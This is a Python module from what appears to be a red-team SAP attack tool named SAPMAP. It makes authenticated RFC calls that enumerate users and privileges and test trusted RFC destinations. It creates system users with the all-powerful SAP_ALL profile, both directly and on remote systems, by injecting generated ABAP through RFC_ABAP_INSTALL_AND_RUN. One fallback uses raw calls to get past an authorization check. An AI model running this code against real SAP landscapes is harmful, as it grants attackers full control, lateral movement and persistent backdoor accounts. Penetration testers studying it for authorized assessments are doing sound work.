#!/usr/bin/env python3
"""
SAPMAP RFC Operations — Authenticated RFC calls to SAP systems.

Uses sap_rfc_ctypes.RFCConnection for all authenticated operations:
  - Retrieve Type-3 RFC connections (via RSRFCCHK execution)
  - Test RFC connections (/SDF/RFC_CHECK)
  - User management (BAPI_USER_GET_DETAIL, BAPI_USER_CREATE1, etc.)
  - Table reads (RFC_READ_TABLE, CNV_MBT_SHELL_GET_CLIENTS)
  - Password hash download (USR02)
  - Client role detection (T000 CCCATEGORY)
  - TCP/IP destination creation (DEST_RFC_TCPIP_CREATE)
"""

import logging
import time
from datetime import datetime
from typing import Optional

from sapmap_models import (
    SAPNode, RFCConnection as RFCConn, Credentials, CreatedUser, Severity, Finding,
)
import sapmap_config
from sapmap_config import (
    SAPMAP_USER_PREFIX, SAPMAP_USER_MAX,
    RFC_CHECK_FM, RFC_CHECK_PARAMS, RFC_LOGON_SUCCESS_TEXT,
    BAPI_USER_CREATE, BAPI_USER_DELETE, BAPI_USER_GET_DETAIL,
    BAPI_USER_PROFILES_ASSIGN, DEST_RFC_TCPIP_CREATE,
    RFC_READ_TABLE, CNV_MBT_SHELL_GET_CLIENTS,
    RSRFCCHK_PROGRAM, RSRFCCHK_JOB_NAME, RSRFCCHK_EXTERNAL_USER,
    DEFAULT_POLL_INTERVAL, DEFAULT_MAX_POLL_ATTEMPTS,
    sapmap_username,
)

from sap_rfc_ctypes import (
    ABAPApplicationError,
    RFCTYPE_CHAR, RFCTYPE_TABLE, RFCTYPE_INT, RFCTYPE_BYTE, RFCTYPE_NUM,
    RFCTYPE_STRUCTURE,
    RFC_IMPORT, RFC_EXPORT, RFC_TABLES,
)

logger = logging.getLogger(__name__)

# SDK path (set globally or per-connection)
_sdk_path = None


def set_sdk_path(path: str):
    """Set the NW RFC SDK library path globally."""
    global _sdk_path
    _sdk_path = path


def _get_connection(node: SAPNode, creds: Credentials = None):
    """Create an RFC connection to a node using credentials.

    Returns an sap_rfc_ctypes.RFCConnection (context manager).
    """
    from sap_rfc_ctypes import RFCConnection

    if creds is None:
        creds = node.best_credentials()
    if creds is None:
        raise ValueError(f"No credentials available for {node.sid}")

    host = node.ip or node.hostname
    params = {
        "ashost": host,
        "sysnr": creds.instance_nr,
        "client": creds.client,
        "user": creds.username,
        "passwd": creds.password,
        "lang": "EN",
    }

    # SAProuter support: the NW RFC SDK natively handles routing
    if node.saprouter:
        params["saprouter"] = node.saprouter

    return RFCConnection(sdk_path=_sdk_path, **params)


# ---------------------------------------------------------------------------
# Test connection
# ---------------------------------------------------------------------------

def test_connection(node: SAPNode, creds: Credentials = None) -> bool:
    """Test if credentials work by opening a connection and pinging."""
    try:
        with _get_connection(node, creds) as conn:
            ok = conn.ping()
            if ok and creds:
                creds.verified = True
                print(f"[+] Connection test OK for {node.sid} "
                      f"(user={creds.username}, client={creds.client}, "
                      f"inst={creds.instance_nr})")
            return ok
    except Exception as e:
        err = str(e)
        print(f"[-] Connection test failed for {node.sid}: {err}")
        if "password" in err.lower() or "logon" in err.lower():
            print(f"    Check username/password and client number")
        elif "communication" in err.lower() or "connect" in err.lower():
            print(f"    Check host/instance number — cannot reach the system")
        elif "library" in err.lower() or "sdk" in err.lower() or "load" in err.lower():
            print(f"    SAP NW RFC SDK not found — set the SDK path in settings")
        return False


# ---------------------------------------------------------------------------
# User existence check
# ---------------------------------------------------------------------------

def check_user_exists(node: SAPNode, username: str,
                      creds: Credentials = None) -> bool:
    """Check if a user exists in the remote system via BAPI_USER_GET_DETAIL."""
    try:
        with _get_connection(node, creds) as conn:
            result = conn.call(BAPI_USER_GET_DETAIL, USERNAME=username)
            ret = result.get("RETURN", {})
            if isinstance(ret, list):
                # Some systems return a table
                for entry in ret:
                    if entry.get("TYPE", "") in ("E", "A"):
                        msg = entry.get("MESSAGE", "")
                        if "does not exist" in msg.lower():
                            return False
                return True
            else:
                if ret.get("TYPE", "") in ("E", "A"):
                    msg = ret.get("MESSAGE", "")
                    if "does not exist" in msg.lower():
                        return False
                return True
    except Exception as e:
        logger.debug(f"User check failed for {username}@{node.sid}: {e}")
        return False


def next_sapmap_username(node: SAPNode, creds: Credentials = None) -> Optional[str]:
    """Find the next available SAPMAP username (SAPMAP00..99)."""
    for i in range(SAPMAP_USER_MAX + 1):
        username = sapmap_username(i)
        if not check_user_exists(node, username, creds):
            return username
    return None


# ---------------------------------------------------------------------------
# User details retrieval
# ---------------------------------------------------------------------------

def get_user_details(node: SAPNode, username: str,
                     creds: Credentials = None) -> dict:
    """Get user profiles and roles via BAPI_USER_GET_DETAIL.

    Returns dict with:
        - profiles: list of profile names
        - roles: list of role (activity group) names
        - has_sap_all: bool
        - error: str if call failed
    """
    result_info = {
        "profiles": [],
        "roles": [],
        "has_sap_all": False,
        "error": "",
        "raw": {},
    }

    try:
        with _get_connection(node, creds) as conn:
            result = conn.call(BAPI_USER_GET_DETAIL, USERNAME=username)
            result_info["raw"] = result

            # Extract profiles
            profiles_table = result.get("PROFILES", [])
            if isinstance(profiles_table, list):
                for row in profiles_table:
                    pname = row.get("BAPIPROF", "") or row.get("PROFILE", "")
                    if pname:
                        result_info["profiles"].append(pname.strip())

            # Extract activity groups (roles)
            roles_table = result.get("ACTIVITYGROUPS", [])
            if isinstance(roles_table, list):
                for row in roles_table:
                    rname = row.get("AGR_NAME", "") or row.get("ROLE", "")
                    if rname:
                        result_info["roles"].append(rname.strip())

            # Check for SAP_ALL
            result_info["has_sap_all"] = "SAP_ALL" in result_info["profiles"]

    except Exception as e:
        error_msg = str(e)
        if "authorization" in error_msg.lower() or "AUTHORIZATION" in error_msg:
            result_info["error"] = "No authorization for BAPI_USER_GET_DETAIL"
        else:
            result_info["error"] = error_msg
        logger.debug(f"User detail retrieval failed for {username}@{node.sid}: {e}")

    return result_info


def _abap_install_and_run(conn, destination: str, username: str) -> dict:
    """Execute BAPI_USER_GET_DETAIL on a remote system via ABAP_INSTALL_AND_RUN.

    Dynamically generates an ABAP program that calls BAPI_USER_GET_DETAIL
    with DESTINATION '<dest>' to retrieve user profiles on the TARGET system.
    The program is compiled and executed on the SOURCE system.

    Tries RFC_ABAP_INSTALL_AND_RUN first, then /SAPDS/RFC_ABAP_INSTALL_RUN
    (available on newer S/4HANA systems).

    Returns dict with: profiles, has_sap_all, error.
    """
    abap_lines = [
        "REPORT zsapmap.",
        "DATA: t_profiles TYPE TABLE OF bapiprof,",
        "      l_profiles LIKE LINE OF t_profiles,",
        "      t_roles    TYPE TABLE OF bapiagr.",
        "CALL FUNCTION 'BAPI_USER_GET_DETAIL'",
        f"  DESTINATION '{destination}'",
        "  EXPORTING",
        f"    username       = '{username}'",
        "  TABLES",
        "    profiles       = t_profiles",
        "    activitygroups = t_roles.",
        "LOOP AT t_profiles INTO l_profiles.",
        "  WRITE: / l_profiles-bapiprof.",
        "ENDLOOP.",
    ]

    run = _run_abap_program(conn, abap_lines, "ZSAPMAP")
    if not run["success"]:
        return {
            "profiles": [],
            "has_sap_all": False,
            "error": run["error"],
        }

    profiles = run["output"]
    return {
        "profiles": profiles,
        "has_sap_all": "SAP_ALL" in profiles,
        "error": "",
    }


def _susr_suim_sap_all_check(conn, destination: str, username: str) -> dict:
    """Check if a remote user has SAP_ALL via SUSR_SUIM_API_RSUSR050_USER.

    Fallback when RFC_ABAP_INSTALL_AND_RUN is blocked ("not permitted in
    this client").  Compares authorization objects of the user on the remote
    system.  If at least 10 key auth objects are present AND the total number
    of entries exceeds 500, we consider SAP_ALL granted.

    Returns dict with: profiles, has_sap_all, error.
    """
    REQUIRED_OBJECTS = {
        "S_DX_MAIN", "S_ECATTADM", "S_PATH", "S_ICF_ADM", "S_BTCH_ADM",
        "S_DEVELOP", "S_DBCON", "S_TABU_DIS", "S_TABU_NAM", "S_USER_ADM",
    }

    try:
        result = conn.call(
            "SUSR_SUIM_API_RSUSR050_USER",
            IV_SYSTEM_A=destination,
            IV_SYSTEM_B=destination,
            IV_USER_A=username,
            IV_USER_B=username,
            IV_TAB_VIEW=1,
        )

        et_tab = result.get("ET_TAB_VIEW1", [])
        total = len(et_tab)
        found_objects = {row.get("OBJCT", "").strip() for row in et_tab
                         if isinstance(row, dict)}
        matched = REQUIRED_OBJECTS & found_objects
        has_sap_all = len(matched) >= len(REQUIRED_OBJECTS) and total > 500

        logger.debug(f"SUSR_SUIM check for {username}@{destination}: "
                     f"{total} entries, {len(matched)}/{len(REQUIRED_OBJECTS)} "
                     f"required objects → SAP_ALL={has_sap_all}")

        profiles = ["very likely SAP_ALL"] if has_sap_all else []
        if has_sap_all:
            print(f"[+] SUSR_SUIM fallback: {username} via {destination} has "
                  f"SAP_ALL ({total} auth entries, "
                  f"{len(matched)}/{len(REQUIRED_OBJECTS)} key objects)")
        else:
            print(f"[-] SUSR_SUIM fallback: {username} via {destination} does "
                  f"NOT have SAP_ALL ({total} entries, "
                  f"{len(matched)}/{len(REQUIRED_OBJECTS)} key objects)")

        return {"profiles": profiles, "has_sap_all": has_sap_all, "error": ""}

    except Exception as e:
        logger.debug(f"SUSR_SUIM fallback failed: {e}")
        return {"profiles": [], "has_sap_all": False,
                "error": f"SUSR_SUIM fallback failed: {e}"}


def get_remote_user_profiles(node: SAPNode, username: str,
                             destination: str,
                             creds: Credentials = None) -> dict:
    """Get user profiles on a REMOTE system via ABAP_INSTALL_AND_RUN.

    Generates an ABAP program that calls BAPI_USER_GET_DETAIL with
    DESTINATION '<dest>' on the source system, which executes the BAPI
    on the target system and returns the profiles.

    Tries RFC_ABAP_INSTALL_AND_RUN first, then /SAPDS/RFC_ABAP_INSTALL_RUN.
    If both fail with "not permitted in this client", falls back to
    SUSR_SUIM_API_RSUSR050_USER for SAP_ALL heuristic detection.

    Returns dict with: profiles, has_sap_all, error.
    """
    result_info = {"profiles": [], "has_sap_all": False, "error": ""}

    try:
        with _get_connection(node, creds) as conn:
            result_info = _abap_install_and_run(conn, destination, username)

        # Fallback: if ABAP_INSTALL_AND_RUN is blocked, open fresh connection
        if (result_info["error"] and
                "not permitted in this client" in result_info["error"].lower()):
            print(f"[*] ABAP_INSTALL_AND_RUN blocked on {node.sid}, "
                  f"trying SUSR_SUIM fallback...")
            with _get_connection(node, creds) as conn2:
                result_info = _susr_suim_sap_all_check(
                    conn2, destination, username)

            if result_info["profiles"]:
                print(f"[+] {node.sid}: Remote profiles for {username} via {destination}: "
                      f"{', '.join(result_info['profiles'])}")
            elif result_info["error"]:
                print(f"[-] {node.sid}: Could not get profiles for {username} via "
                      f"{destination}: {result_info['error']}")
            else:
                print(f"[*] {node.sid}: No profiles found for {username} via {destination}")

    except Exception as e:
        result_info["error"] = str(e)
        logger.debug(f"Remote user detail retrieval failed: {e}")

    return result_info


# ---------------------------------------------------------------------------
# Create user via BAPI
# ---------------------------------------------------------------------------

def create_user_via_bapi(node: SAPNode, username: str, password: str,
                         client: str, creds: Credentials = None) -> dict:
    """Create a user with SAP_ALL via BAPI_USER_CREATE1 + BAPI_USER_PROFILES_ASSIGN.

    Returns dict with: success, message, username
    """
    result = {"success": False, "message": "", "username": username}

    try:
        with _get_connection(node, creds) as conn:
            # Step 1: Create the user
            create_result = conn.call(
                BAPI_USER_CREATE,
                USERNAME=username,
                PASSWORD={"BAPIPWD": password},
                LOGONDATA={
                    "USTYP": "S",      # System/service user
                    "GLTGB": "99991231",  # Valid to (far future)
                },
                ADDRESS={
                    "FIRSTNAME": "SAPMAP",
                    "LASTNAME": "Security",
                    "FUNCTION": "SAPMAP Red Team",
                },
            )

            ret = create_result.get("RETURN", {})
            if isinstance(ret, list):
                for entry in ret:
                    if entry.get("TYPE", "") in ("E", "A"):
                        result["message"] = entry.get("MESSAGE", "Unknown error")
                        print(f"[-] {node.sid}: User creation failed: {result['message']}")
                        return result
            elif ret.get("TYPE", "") in ("E", "A"):
                result["message"] = ret.get("MESSAGE", "Unknown error")
                print(f"[-] {node.sid}: User creation failed: {result['message']}")
                return result

            print(f"[+] User {username} created in {node.sid} client {client}")

            # Step 2: Assign SAP_ALL profile
            try:
                assign_result = conn.call(
                    BAPI_USER_PROFILES_ASSIGN,
                    USERNAME=username,
                    PROFILES=[{"BAPIPROF": "SAP_ALL"}, {"BAPIPROF": "SAP_NEW"}],
                )
                ret = assign_result.get("RETURN", {})
                if isinstance(ret, list):
                    for entry in ret:
                        if entry.get("TYPE", "") in ("E", "A"):
                            print(f"[!] {node.sid}: SAP_ALL assignment warning: {entry.get('MESSAGE', '')}")
                elif ret.get("TYPE", "") in ("E", "A"):
                    print(f"[!] {node.sid}: SAP_ALL assignment warning: {ret.get('MESSAGE', '')}")
                else:
                    print(f"[+] {node.sid}: SAP_ALL profile assigned to {username}")
            except Exception as e:
                print(f"[!] {node.sid}: Could not assign SAP_ALL: {e}")

            result["success"] = True
            result["message"] = f"User {username} created with SAP_ALL"

    except Exception as e:
        result["message"] = str(e)
        logger.error(f"BAPI user creation failed: {e}")
        print(f"[-] {node.sid}: User creation error: {e}")

    return result


# ---------------------------------------------------------------------------
# Create user on REMOTE system via ABAP_INSTALL_AND_RUN + DESTINATION
# ---------------------------------------------------------------------------

def _run_abap_program(conn, abap_lines: list, program_name: str = "ZSAPMAP") -> dict:
    """Run an ABAP program via RFC_ABAP_INSTALL_AND_RUN or /SAPDS variant.

    Shared helper that handles FM detection and output parsing.
    Returns dict with: success, output (list of strings), error, fm_name.
    """
    program_table = [{"LINE": line} for line in abap_lines]

    # Determine which FM is available
    fm_name = None
    for candidate in ("RFC_ABAP_INSTALL_AND_RUN",
                      "/SAPDS/RFC_ABAP_INSTALL_RUN"):
        try:
            conn.call("FUNCTION_EXISTS", FUNCNAME=candidate)
            fm_name = candidate
            break
        except Exception:
            continue

    if not fm_name:
        return {
            "success": False, "output": [], "fm_name": None,
            "error": "Neither RFC_ABAP_INSTALL_AND_RUN nor "
                     "/SAPDS/RFC_ABAP_INSTALL_RUN available",
        }

    try:
        run_result = conn.call(
            fm_name,
            PROGRAMNAME=program_name,
            MODE="F",
            PROGRAM=program_table,
        )

        # Parse WRITES output
        writes = run_result.get("WRITES", [])
        output_lines = []
        for row in writes:
            line = ""
            if isinstance(row, dict):
                line = (row.get("ZEILE", "") or row.get("LINE", "") or
                        row.get("WA", "")).strip()
            elif isinstance(row, str):
                line = row.strip()
            if line:
                output_lines.append(line)

        return {
            "success": True, "output": output_lines,
            "fm_name": fm_name, "error": "",
        }
    except Exception as e:
        return {
            "success": False, "output": [],
            "fm_name": fm_name, "error": str(e),
        }


def create_user_via_destination(node: SAPNode, destination: str,
                                 username: str, password: str,
                                 creds: Credentials = None) -> dict:
    """Create a user on a REMOTE system via ABAP_INSTALL_AND_RUN.

    Generates an ABAP program that calls BAPI_USER_CREATE1 and
    BAPI_USER_PROFILES_ASSIGN with DESTINATION '<dest>' on the SOURCE
    system.  The BAPIs execute on the TARGET system through the RFC
    connection.

    Returns dict with: success, message, username
    """
    result = {"success": False, "message": "", "username": username}

    # Keep all ABAP lines under 72 chars (PROGRAM table LINE width)
    # Use short variable names: d=destination
    d = destination
    u = username
    p = password

    abap_lines = [
        "REPORT zsapm.",
        "DATA: rv TYPE TABLE OF bapiret2,",
        "      rs LIKE LINE OF rv,",
        "      rt TYPE TABLE OF bapiret2,",
        "      pw TYPE bapipwd,",
        "      px TYPE bapipwdx,",
        "      lo TYPE bapilogond,",
        "      ad TYPE bapiaddr3,",
        "      pt TYPE TABLE OF bapiprof,",
        "      ps TYPE bapiprof.",
        f"pw-bapipwd = '{p}'.",
        "lo-ustyp = 'S'.",
        "lo-gltgb = '99991231'.",
        "ad-firstname = 'SAPMAP'.",
        "ad-lastname = 'Security'.",
        "CALL FUNCTION 'BAPI_USER_CREATE1'",
        f"  DESTINATION '{d}'",
        "  EXPORTING",
        f"    username  = '{u}'",
        "    password  = pw",
        "    logondata = lo",
        "    address   = ad",
        "  TABLES",
        "    return    = rv.",
        "LOOP AT rv INTO rs.",
        "  IF rs-type CA 'EA'.",
        "    WRITE: / 'ERR:', rs-message.",
        "  ELSE.",
        "    WRITE: / 'USER_CREATED'.",
        # Set productive password via BAPI_USER_CHANGE
        # (CREATE1 only sets initial pwd requiring change)
        "    CLEAR rv.",
        f"    px-bapipwd = '{p}'.",
        "    CALL FUNCTION 'BAPI_USER_CHANGE'",
        f"      DESTINATION '{d}'",
        "      EXPORTING",
        f"        username  = '{u}'",
        "        password  = pw",
        "        passwordx = px.",
        "    ps-bapiprof = 'SAP_ALL'.",
        "    APPEND ps TO pt.",
        "    ps-bapiprof = 'SAP_NEW'.",
        "    APPEND ps TO pt.",
        "    CALL FUNCTION",
        "      'BAPI_USER_PROFILES_ASSIGN'",
        f"      DESTINATION '{d}'",
        "      EXPORTING",
        f"        username = '{u}'",
        "      TABLES",
        "        profiles = pt",
        "        return   = rt.",
        "    WRITE: / 'SAP_ALL_OK'.",
        "  ENDIF.",
        "ENDLOOP.",
    ]

    try:
        with _get_connection(node, creds) as conn:
            print(f"[*] {node.sid}: Running BAPI_USER_CREATE1 via "
                  f"ABAP_INSTALL_AND_RUN DESTINATION '{d}'...")
            run = _run_abap_program(conn, abap_lines, "ZSAPM")

            if not run["success"]:
                result["message"] = run["error"]
                print(f"[-] {node.sid}: {run['error']}")
                return result

            print(f"[*] {node.sid}: Used FM: {run['fm_name']}")
            output = run["output"]
            for line in output:
                print(f"    ABAP output: {line}")

            if any("USER_CREATED" in l for l in output):
                result["success"] = True
                if any("SAP_ALL_OK" in l for l in output):
                    result["message"] = (f"User {u} created with "
                                         f"SAP_ALL via DESTINATION")
                    print(f"[+] {node.sid}: User {u} created and SAP_ALL "
                          f"assigned on remote system via {d}")
                else:
                    result["message"] = (f"User {u} created via "
                                         f"DESTINATION (SAP_ALL uncertain)")
                    print(f"[+] {node.sid}: User {u} created on remote system "
                          f"via {d} (SAP_ALL uncertain)")
            else:
                err = [l for l in output if "ERR:" in l]
                if err:
                    result["message"] = err[0]
                    print(f"[-] {node.sid}: Remote user creation: {err[0]}")
                else:
                    result["message"] = (f"Unexpected output: "
                                         f"{output}")
                    print(f"[-] {node.sid}: Unexpected output: {output}")

    except Exception as e:
        result["message"] = str(e)
        logger.error(f"Remote user creation via DESTINATION: {e}")
        print(f"[-] {node.sid}: Remote user creation error: {e}")

    return result


# ---------------------------------------------------------------------------
# Delete user via BAPI
# ---------------------------------------------------------------------------

def delete_user(node: SAPNode, username: str,
                creds: Credentials = None) -> bool:
    """Delete a user via BAPI_USER_DELETE."""
    try:
        with _get_connection(node, creds) as conn:
            result = conn.call(BAPI_USER_DELETE, USERNAME=username)
            ret = result.get("RETURN", {})
            if isinstance(ret, list):
                for entry in ret:
                    if entry.get("TYPE", "") in ("E", "A"):
                        print(f"[-] {node.sid}: Delete failed: {entry.get('MESSAGE', '')}")
                        return False
            elif ret.get("TYPE", "") in ("E", "A"):
                print(f"[-] {node.sid}: Delete failed: {ret.get('MESSAGE', '')}")
                return False
            print(f"[+] User {username} deleted from {node.sid}")
            return True
    except Exception as e:
        logger.error(f"User deletion failed for {username}@{node.sid}: {e}")
        print(f"[-] {node.sid}: Delete error: {e}")
        return False


# ---------------------------------------------------------------------------
# RFC connection testing (/SDF/RFC_CHECK with DEST_CHECK_CONNECTION fallback)
# ---------------------------------------------------------------------------

def _test_via_sdf_rfc_check(conn, destination_name: str, result: dict) -> bool:
    """Try /SDF/RFC_CHECK. Returns True if the FM exists, False if not found."""
    try:
        check_result = conn.call(
            RFC_CHECK_FM,
            IV_DESTINATION=destination_name,
            **RFC_CHECK_PARAMS,
        )

        result["logon_message"] = check_result.get("EV_LOGON_MESSAGE", "").strip()
        result["ping_ok"] = check_result.get("EV_PING_MESSAGE", "").strip() != ""
        result["ping_status"] = str(check_result.get("EV_PING_STATUS", "")).strip()
        logon_status = check_result.get("EV_LOGON_STATUS", "")
        if str(logon_status).strip() == "1":
            result["logon_ok"] = True
        else:
            result["logon_ok"] = RFC_LOGON_SUCCESS_TEXT in result["logon_message"]

        lat_ms = check_result.get("EV_LATENCY_IN_MS", 0)
        if isinstance(lat_ms, int) and lat_ms > 0:
            result["latency_ms"] = lat_ms
        else:
            latency_msg = check_result.get("EV_LATENCY_MESSAGE", "")
            if latency_msg:
                try:
                    import re
                    match = re.search(r'(\d+)', latency_msg)
                    if match:
                        result["latency_ms"] = int(match.group(1))
                except Exception:
                    pass
        return True
    except ABAPApplicationError as e:
        if getattr(e, "key", "") == "FU_NOT_FOUND":
            return False  # FM doesn't exist — caller should use fallback
        raise


def _test_via_dest_check(conn, destination_name: str, result: dict):
    """Fallback: use DEST_CHECK_CONNECTION (available on older NW releases).

    AUTHORIZATION_TEST_RESULT='' means logon OK, 'E' means failed.
    CONNECTION_TEST_RESULT='' means TCP connection OK.
    CONNECTION_PROPERTIES contains remote SID, client, basis release.
    """
    check_result = conn.call("DEST_CHECK_CONNECTION",
                             NAME=destination_name)

    auth_result = check_result.get("AUTHORIZATION_TEST_RESULT", "X").strip()
    conn_result = check_result.get("CONNECTION_TEST_RESULT", "X").strip()
    auth_error = check_result.get("AUTHORIZATION_ERROR_TEXT", "").strip()
    conn_error = check_result.get("CONNECTION_ERROR_TEXT", "").strip()

    result["logon_ok"] = auth_result == ""
    result["ping_ok"] = conn_result == ""
    result["logon_message"] = auth_error or ("RFC Logon successful."
                                             if result["logon_ok"] else "")

    # Extract remote system info from CONNECTION_PROPERTIES
    props = check_result.get("CONNECTION_PROPERTIES", {})
    if isinstance(props, dict):
        result["remote_sid"] = props.get("SYSID", "").strip()
        result["remote_client"] = props.get("CLIENT_USED", "").strip()
        result["remote_release"] = props.get("BASIS_RELEASE", "").strip()


def _test_via_dest_check_raw(conn, destination_name: str, result: dict):
    """Fallback: call DEST_CHECK_CONNECTION via call_raw (bypasses
    RFC_GET_FUNCTION_INTERFACE).  Used when the user has SAP_ALL in
    the database but the authorization buffer hasn't been refreshed yet.
    """
    from sap_rfc_ctypes import RFCTYPE_STRUCTURE, RFC_CHANGING

    # Build DEST_CHECK_CONNECTION function description manually
    # Parameters: NAME (import CHAR 32), AUTHORIZATION_TEST_RESULT (export CHAR 1),
    #             CONNECTION_TEST_RESULT (export CHAR 1), etc.
    props_td = conn._make_type_desc('DEST_CHECK_PROPS', [
        ('SYSID',         RFCTYPE_CHAR, 8,  16),
        ('CLIENT_USED',   RFCTYPE_CHAR, 3,  6),
        ('BASIS_RELEASE', RFCTYPE_CHAR, 4,  8),
        ('HOSTNAME',      RFCTYPE_CHAR, 32, 64),
        ('IPADDR',        RFCTYPE_CHAR, 15, 30),
    ])

    func_desc = conn._make_func_desc('DEST_CHECK_CONNECTION', [
        ('NAME',                       RFC_IMPORT, RFCTYPE_CHAR,      64,  32, None),
        ('AUTHORIZATION_TEST_RESULT',  RFC_EXPORT, RFCTYPE_CHAR,      2,   1,  None),
        ('AUTHORIZATION_ERROR_TEXT',   RFC_EXPORT, RFCTYPE_CHAR,      150, 75, None),
        ('CONNECTION_TEST_RESULT',     RFC_EXPORT, RFCTYPE_CHAR,      2,   1,  None),
        ('CONNECTION_ERROR_TEXT',      RFC_EXPORT, RFCTYPE_CHAR,      150, 75, None),
        ('CONNECTION_PROPERTIES',      RFC_EXPORT, RFCTYPE_STRUCTURE, 0,   0,  props_td),
    ])

    check_result = conn.call_raw('DEST_CHECK_CONNECTION', func_desc,
                                  NAME=destination_name)

    auth_result = check_result.get("AUTHORIZATION_TEST_RESULT", "X").strip()
    conn_result = check_result.get("CONNECTION_TEST_RESULT", "X").strip()
    auth_error = check_result.get("AUTHORIZATION_ERROR_TEXT", "").strip()

    result["logon_ok"] = auth_result == ""
    result["ping_ok"] = conn_result == ""
    result["logon_message"] = auth_error or ("RFC Logon successful."
                                             if result["logon_ok"] else "")

    props = check_result.get("CONNECTION_PROPERTIES", {})
    if isinstance(props, dict):
        result["remote_sid"] = props.get("SYSID", "").strip()
        result["remote_client"] = props.get("CLIENT_USED", "").strip()
        result["remote_release"] = props.get("BASIS_RELEASE", "").strip()


def test_rfc_destination(node: SAPNode, destination_name: str,
                         creds: Credentials = None,
                         rfc_check_cache: dict = None) -> dict:
    """Test an RFC destination via /SDF/RFC_CHECK, falling back to
    DEST_CHECK_CONNECTION on older systems where the FM doesn't exist.

    Returns dict with: logon_ok, ping_ok, latency_ms, logon_message, error
    """
    # Check cache first
    if rfc_check_cache and destination_name in rfc_check_cache:
        return rfc_check_cache[destination_name]

    result = {
        "logon_ok": False,
        "ping_ok": False,
        "latency_ms": 0,
        "logon_message": "",
        "error": "",
    }

    try:
        with _get_connection(node, creds) as conn:
            if not _test_via_sdf_rfc_check(conn, destination_name, result):
                # /SDF/RFC_CHECK not available — fall back
                logger.debug(f"/SDF/RFC_CHECK not found on {node.sid}, "
                             f"using DEST_CHECK_CONNECTION")
                _test_via_dest_check(conn, destination_name, result)

    except Exception as e:
        err_msg = str(e).split("\n")[0]
        result["error"] = err_msg
        logger.debug(f"RFC check failed for {destination_name}@{node.sid}: {e}")

        # If the error is due to RFC_GET_FUNCTION_INTERFACE not authorized,
        # try again with call_raw (bypasses the SDK metadata lookup)
        if "RFC_GET_FUNCTION_INTERFACE" in str(e) or "No RFC authorization" in str(e):
            try:
                with _get_connection(node, creds) as conn:
                    _test_via_dest_check_raw(conn, destination_name, result)
                    result["error"] = ""  # clear the error on success
            except Exception as e2:
                result["error"] = str(e2).split("\n")[0]
                logger.debug(f"call_raw DEST_CHECK also failed: {e2}")

    # Cache the result
    if rfc_check_cache is not None:
        rfc_check_cache[destination_name] = result

    return result


def ping_rfc_destination(node: SAPNode, destination_name: str,
                         creds: Credentials = None) -> dict:
    """Ping an RFC destination via DEST_CHECK_CONNECTION (primary) which
    also returns the remote SID, falling back to /SDF/RFC_CHECK + separate
    RFC_GET_SYSTEM_INFO if DEST_CHECK_CONNECTION is unavailable.

    Returns dict with: ping_ok, ping_message, remote_sid, remote_hostname,
                       logon_ok, error
    """
    result = {
        "ping_ok": False, "ping_message": "", "logon_ok": False,
        "remote_sid": "", "remote_hostname": "", "remote_ip": "",
        "error": "",
    }

    try:
        with _get_connection(node, creds) as conn:
            # Primary: DEST_CHECK_CONNECTION — returns SID in one call
            try:
                check_result = conn.call("DEST_CHECK_CONNECTION",
                                         NAME=destination_name)
                conn_result = check_result.get(
                    "CONNECTION_TEST_RESULT", "X").strip()
                auth_result = check_result.get(
                    "AUTHORIZATION_TEST_RESULT", "X").strip()
                result["ping_ok"] = conn_result == ""
                result["logon_ok"] = auth_result == ""
                result["ping_message"] = (
                    check_result.get("CONNECTION_ERROR_TEXT", "").strip()
                    or ("OK" if result["ping_ok"] else ""))

                props = check_result.get("CONNECTION_PROPERTIES", {})
                if isinstance(props, dict):
                    result["remote_sid"] = props.get(
                        "SYSID", "").strip()
                    result["remote_hostname"] = props.get(
                        "RFCHOST", "").strip()

                # Get IP via RFC_GET_SYSTEM_INFO with DESTINATION
                # (RFCSI_EXPORT contains RFCIPADDR; CONNECTION_PROPERTIES does not)
                if result["ping_ok"]:
                    try:
                        info = conn.call(
                            "RFC_GET_SYSTEM_INFO",
                            DESTINATION=destination_name,
                        )
                        export = info.get("RFCSI_EXPORT", {})
                        if isinstance(export, dict):
                            result["remote_ip"] = (
                                export.get("RFCIPV6ADDR", "")
                                or export.get("RFCIPADDR", "")
                                or "").strip()
                            if not result["remote_sid"]:
                                result["remote_sid"] = (
                                    export.get("RFCSYSID", "")
                                    or "").strip()
                            if not result["remote_hostname"]:
                                result["remote_hostname"] = (
                                    export.get("RFCHOST", "")
                                    or "").strip()
                    except Exception:
                        pass
            except ABAPApplicationError as e:
                if getattr(e, "key", "") == "FU_NOT_FOUND":
                    # DEST_CHECK_CONNECTION not available — fall back to
                    # /SDF/RFC_CHECK for ping + RFC_GET_SYSTEM_INFO for SID
                    logger.debug("DEST_CHECK_CONNECTION not found, "
                                 "falling back to /SDF/RFC_CHECK")
                    try:
                        check_result = conn.call(
                            RFC_CHECK_FM,
                            IV_DESTINATION=destination_name,
                            IV_PING="X",
                        )
                        msg = check_result.get(
                            "EV_PING_MESSAGE", "").strip()
                        status = str(check_result.get(
                            "EV_PING_STATUS", "")).strip()
                        result["ping_message"] = msg
                        result["ping_ok"] = status == "1"
                    except ABAPApplicationError as e2:
                        if getattr(e2, "key", "") != "FU_NOT_FOUND":
                            raise
                    # Get SID separately
                    if result["ping_ok"]:
                        try:
                            info = conn.call(
                                "RFC_GET_SYSTEM_INFO",
                                DESTINATION=destination_name,
                            )
                            export = info.get("RFCSI_EXPORT", {})
                            if isinstance(export, dict):
                                result["remote_sid"] = (
                                    export.get("RFCSYSID", "")
                                    or "").strip()
                                result["remote_hostname"] = (
                                    export.get("RFCHOST", "")
                                    or "").strip()
                                result["remote_ip"] = (
                                    export.get("RFCIPV6ADDR", "")
                                    or export.get("RFCIPADDR", "")
                                    or "").strip()
                        except Exception:
                            pass
                else:
                    raise
    except Exception as e:
        result["error"] = str(e)

    return result


def get_remote_sysinfo(node: SAPNode, destination_name: str,
                       creds: Credentials = None) -> dict:
    """Get remote system info via RFC_GET_SYSTEM_INFO with DESTINATION.

    Calls RFC_GET_SYSTEM_INFO on the source system with DESTINATION
    parameter to retrieve the remote system's SID, hostname, etc.
    Output is in RFCSI_EXPORT field RFCSYSID.

    Returns dict with: sid, hostname, ip, error
    """
    result = {"sid": "", "hostname": "", "ip": "", "error": ""}

    try:
        with _get_connection(node, creds) as conn:
            info = conn.call(
                "RFC_GET_SYSTEM_INFO",
                DESTINATION=destination_name,
            )
            export = info.get("RFCSI_EXPORT", {})
            if isinstance(export, dict):
                result["sid"] = (export.get("RFCSYSID", "") or "").strip()
                result["hostname"] = (export.get("RFCHOST", "") or "").strip()
    except Exception as e:
        result["error"] = str(e)

    return result


# ---------------------------------------------------------------------------
